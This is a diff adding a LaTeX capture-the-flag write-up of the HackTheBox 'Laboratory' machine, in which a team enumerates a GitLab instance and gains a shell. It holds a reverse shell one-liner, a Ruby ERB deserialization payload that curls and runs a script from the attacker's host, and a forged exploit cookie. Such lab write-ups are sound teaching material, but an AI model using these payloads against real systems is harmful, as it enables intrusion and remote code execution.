@@ -2,20 +2,131 @@
 
 \begin{document}
 
-\section{Hack The Box Jonathan}
+\section{HackTheBox Laboratory}
+\underline{This section is WIP! formatting will follow}
 
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec ultrices a lectus quis dignissim. Sed porttitor, augue eget sodales dignissim, eros lectus faucibus ipsum, id auctor mauris velit vel urna. Mauris placerat nibh semper faucibus rutrum. Proin pellentesque convallis orci eu mollis. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Duis maximus sodales metus, vitae ullamcorper lacus. Fusce sit amet magna at sem finibus hendrerit vitae ac nisi. Aliquam ipsum quam, imperdiet et felis eu, tempus tristique lacus. Fusce placerat odio eu lacus convallis, id pharetra mauris molestie. Duis dui tellus, semper eu aliquam vel, consequat at elit. Phasellus eget libero et nulla pretium consectetur id at elit. Vivamus volutpat blandit risus, sit amet imperdiet neque ultrices sed. In faucibus lorem sed aliquet iaculis. Proin auctor libero in tortor euismod, eu lobortis enim finibus. Vivamus mollis et est at porta. Donec egestas felis nec lectus scelerisque tempor.
+\subsection{Scanning}
+First, we will scan the target for running services
+\begin{lstlisting}
+nmap -sS -sV -O 10.10.10.216
+...
+Not shown: 997 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     Apache httpd 2.4.41
+443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
+\end{lstlisting}
+SSH and http, not much to go on.
+Other scans like a null scan or even a UDP scan did not reveal any more information. It is safe to say that the firewall is set up properly.
+\subsection{laboratory.htb}
+Going to 10.10.10.216 in browser redirects us to https://laboratory.htb but dns not found. 
+We should add laboratory.htb to our /etc/hosts file.
+After that, https://laboratory.htb brings us to a website with a self-signed certificate.
+\subsubsection{Enumeration}
+On the website 'dexter' is named the CEO of the company. This is a username we should remember for later. 
 
-\subsection{First impressions}
+If we let dirb loose on the website we find the assets and image directories that feed the website, but aside from that, there isn't much we can find there.
 
-\begin{wrapfigure}{R}{0.25\textwidth}
-  \includegraphics[width=\linewidth]{images/picture.jpg}
-\end{wrapfigure}
+In an attempt to do more enumeration and discover more info, we tried the vhost\_scanner Metasploit module. Unfortunately, it seems that the main website is configured with a wildcard since we get weird results like *.n.laboratory.htb
+\subsection{git.laboratory.htb}
+Looking back at the self-signed certificate we can see that it is registered for 'git.laboratory.htb'. If we add that to our host file with the same IP address and navigate to it, we get the login page of a Gitlab instance. 
+\subsubsection{Enumeration}
 
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec ultrices a lectus quis dignissim. Sed porttitor, augue eget sodales dignissim, eros lectus faucibus ipsum, id auctor mauris velit vel urna. Mauris placerat nibh semper faucibus rutrum. Proin pellentesque convallis orci eu mollis. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Duis maximus sodales metus, vitae ullamcorper lacus. Fusce sit amet magna at sem finibus hendrerit vitae ac nisi. Aliquam ipsum quam, imperdiet et felis eu, tempus tristique lacus. Fusce placerat odio eu lacus convallis, id pharetra mauris molestie. Duis dui tellus, semper eu aliquam vel, consequat at elit. Phasellus eget libero et nulla pretium consectetur id at elit. Vivamus volutpat blandit risus, sit amet imperdiet neque ultrices sed. In faucibus lorem sed aliquet iaculis. Proin auctor libero in tortor euismod, eu lobortis enim finibus. Vivamus mollis et est at porta. Donec egestas felis nec lectus scelerisque tempor.
 
-Donec vestibulum, tortor eu condimentum malesuada, purus quam condimentum tortor, auctor imperdiet quam turpis sed metus. Pellentesque et risus eget erat vestibulum convallis pharetra at ligula. Suspendisse urna neque, aliquam et felis at, molestie pulvinar augue. Curabitur elementum, ex nec varius aliquam, neque dui efficitur tortor, ac vulputate sapien nulla et ligula. Duis sit amet finibus tellus. Mauris eget condimentum nisl. Nullam orci neque, auctor eu varius sed, consectetur pharetra velit. Praesent viverra sit amet nulla eget pretium. Ut eu mattis metus. In hac habitasse platea dictumst. Cras faucibus lorem vel faucibus sagittis. Phasellus feugiat diam ante, nec dignissim urna consectetur ut. Praesent eros arcu, suscipit a porta egestas, aliquam quis orci. Cras ultrices feugiat diam, eu lacinia odio semper id.
+%The initial reflex was to brute-force the login page (since we have a suspected username to try out),%
+The login page might be vulnerable to brute-forcing. It's also possible to register yourself as a user. This registration form told us a few things just by clientside validation. It told us that 'dexter' is indeed a username that exists on the Gitlab instance. It also told us that we can't register with a Gmail address. Registering with a non-existent email address that ends with 'laboratory.htb' did the trick and we were presented with a completely empty Gitlab workspace.
 
-Nulla sit amet ipsum molestie, pellentesque tortor vel, volutpat arcu. Pellentesque cursus erat vitae ipsum laoreet, vitae imperdiet diam ultrices. Vivamus vitae urna ac ante convallis tempus eu sed nibh. Sed commodo turpis et ligula commodo scelerisque. Nulla sit amet justo facilisis tortor imperdiet venenatis. Integer dapibus dui sapien. Ut sollicitudin at felis nec efficitur. Duis nunc justo, elementum vel leo aliquam, tincidunt imperdiet mi. Mauris pharetra vitae risus et laoreet. Mauris ultricies, ipsum sit amet tincidunt dictum, magna mauris scelerisque erat, id congue tellus justo eget ex. 
+On the explore/projects page we can see all 'internal' projects on the instance. There we find the source for the website. The source itself isn't useful on first glance (although we could use it to make a fake copy to mislead customers). There is an open issue however made by a user called 'seven'.
+\subsubsection{Exploitation}
+There's an exploit on \href{https://www.exploit-db.com/exploits/49076}{exploit-db} that allows an authenticated user to access any world-readable files. It's a python script that creates projects through the Gitlab API and deposits the files in the description of an issue. It was necessary to edit this file by hand because the encoding caused issues and some of the syntax was malformed. The working source can be found in section \ref{sec:gitlabhack}.
 
+
+Through this method, we can access /etc/password. In the file we find a few service-related users, but no true user accounts. This might be an indication that the Gitlab instance is a (docker) container. 
+
+We can mess around with the Gitlab API some more. We can, for example, get a list of users with gitlab.users.list(); Again we get confirmation of a user called 'dexter', but there's also a user called 'ghost'.
+Unfortunately, we're still bound by the permissions our user has, so we can't mess with other accounts.
+
+We tried the git-submodule exploit, which, in older versions of git, can do a remote code execution by loading a git submodule. Unfortunately, Gitlab does not clone submodules that way.
+
+After a lot of searching it turns out our vulnerability was mentioned in the \href{https://gitlab.com/gitlab-org/gitlab/-/issues/212175#note_310498691}{issue} describing the arbitrary file read exploit. 
+
+Once we grab the secret.yml file with the python script, we need to setup a docker container with the same version of gitlab, and give it the same secret\_key\_base. How to set up docker can be found \href{https://docs.gitlab.com/omnibus/docker/}{here} (although the container image we want is gitlab-ce:12.8.1-ce.0).
+\emph{Note: Gitlab does take some resources to run, so its best to increase the resources your VM has access to}
+The command we used was
+\begin{lstlisting}[language=bash]
+export GITLAB_HOME=/srv/gitlab
+sudo docker run --detach --hostname gitlab.example.com --publish 443:443 \
+--publish 80:80 --name gitlab --restart always \
+    --volume $GITLAB_HOME/config:/etc/gitlab \
+    --volume $GITLAB_HOME/logs:/var/log/gitlab \
+    --volume $GITLAB_HOME/data:/var/opt/gitlab \
+    gitlab/gitlab-ce:12.8.1-ce.0
+\end{lstlisting}
+
+Wait a few minutes for the initial configuration, and open a shell in the docker container \lstinline{docker exec -it gitlab /bin/bash}.
+Open \lstinline{/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml} and replace the \lstinline{secret\_key\_base} with the one from the target. 
+
+Now that we have that setup we can start making a reverse shell.
+On our machine, we make a bash script with the payload. For example:
+\begin{lstlisting}[language=bash]
+bash -i >& /dev/tcp/10.10.14.138/4444 0>&1
+\end{lstlisting}
+Now, we serve this file like so:
+\lstinline{python3 -m http.server 8080}
+
+On our gitlab docker instance, we start gitlab-rails console and paste this inside:
+\begin{lstlisting}[language=ruby]
+`touch local`
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `test -f local || curl 10.10.14.138:8080/payload.sh -o /tmp/payload.sh && chmod 777 /tmp/payload.sh && bash /tmp/payload.sh` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+\end{lstlisting}
+\emph{Important!} change the IP on the sixth line to the IP of your machine.
+
+We should get a long encoded string back. This is our cookie.
+We can now start listening with netcat:
+\begin{lstlisting}
+nc -nvlp 4444
+\end{lstlisting}
+And send the cookie to the server:
+\begin{lstlisting}[language=bash]
+curl -vvv 'https://git.laboratory.htb/users/sign_in' -k -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAbcjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgdGVzdCAtZiBsb2NhbCB8fCBjdXJsIDEwLjEwLjE0LjEzODo4MDgwL3BheWxvYWQuc2ggLW8gL3RtcC9wYXlsb2FkLnNoICYmIGNobW9kIDc3NyAvdG1wL3BheWxvYWQuc2ggJiYgYmFzaCAvdG1wL3BheWxvYWQuc2hgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--939122d8a19f2f2161879a088a66870eee7478f8"
+\end{lstlisting}
+After that, we should get a shell in our netcat window.
+\emph{We tried making a reverse shell directly, but it failed for some reason. Perhaps ruby was parsing bash characters.}
+\subsection{gitlab}
+\subsubsection{Enumeration}
+If we cd to \lstinline{~/.ssh}, we find a mysterious \lstinline{key.txt} file. This is an openssh private key. If we copy paste it to our machine and test it with ssh-keygen -l -f, we see that the format is invalid. To fix this, we have to remove all the spaces in the file and add a newline after the header and before the footer. Also make sure the headers have the appropriate spaces restored.
+
+Now we need to convert the key to a pem format and generate the public key.
+\begin{lstlisting}
+ssh-keygen -p -N "" -m pem -f id_laboratory
+\end{lstlisting}
+We can see that the label is 'root@laboratory'. However, we get a public key denied if we try to ssh into root@git.laboratory.htb
+
+Given the information we gathered earlier, we tried dexter@git.laboratory.htb, and it worked! There we found the user.txt file containing our first flag.
+
+Due to time restraints, we couldn't manage to get root access in the box.
+
+\subsection{Conclusion}
+\subsubsection{Difficulty}
+The difficulty set by the creator of the box is 'easy'. Judging by the difficulty ratings by people who've completed the box this is definitely not accurate, and I agree. The exploits required a lot of setups to work, and chaining exploits was required.
+\subsubsection{What we learned}
+There's definitely a lot to learn about this box. Gitlab is a very popular and important piece of software, and it's surprising to see that such vulnerabilities exist in relatively modern versions. Yet again this reminds us to always check if updates are available for all our software. It's also important to note that, while not all vulnerabilities lead to complete control, there's still useful information to be found from 'valid' usage of the software. We did find out that 'dexter' was a valid Gitlab username just by trying out the register form. Or we could use the Gitlab API to find more usernames. 
+
+We could have also used the repository containing the website to make a clone and mislead customers. It all depends on the goal of the intruder.
+\subsubsection{What could have gone differently}
+We spent a lot of time trying different exploits after we had discovered the arbitrary file read exploit. They ultimately didn't give us any more information. Had we read up a bit more about the AFR exploit, we would have found what we were looking for immediately. Fortunately, working in a team enables us to double-check each other that way. 
+
+A lot of time was also wasted in trying to get a more 'elegant' remote shell (as in, executing the bash command directly with the payload) rather than the workaround of curling a script from our local machine. The most elegant solution is not always the most time-efficient. 
+
+\subsection{Appendix}
+\subsubsection{Fileread from gitlab}
+\label{sec:gitlabhack}
+\subfile{../appendix/htb_jonathan_files/gitlab-hack.tex}
 \end{document}
